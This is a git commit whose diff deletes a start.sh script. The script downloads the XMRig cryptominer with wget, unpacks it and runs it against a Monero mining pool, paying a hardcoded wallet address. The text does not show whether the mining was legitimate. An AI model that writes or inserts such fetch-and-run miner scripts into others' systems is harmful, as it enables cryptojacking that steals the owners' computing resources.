e1600a3d6e0a4c891ebf7f42e56b6cc19fd95344
Titaucho <rdzleon14@gmail.com>
2025-06-29 11:56:56 -0400

    REPUESTO

--- start.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz
-tar -xvf xmrig-6.21.3-linux-x64.tar.gz
-cd xmrig-6.21.3
-./xmrig -o pool.minexmr.com:4444 -u 42Puhf3xWuiUqzoYQEfZvU7sJ5yMFYyMsh7S3v52vRrqV9aH7P1i4nHAEAqJWgnHszgL5oQDipjhDT93d9QLvLoK4yeaoCo -k --tls
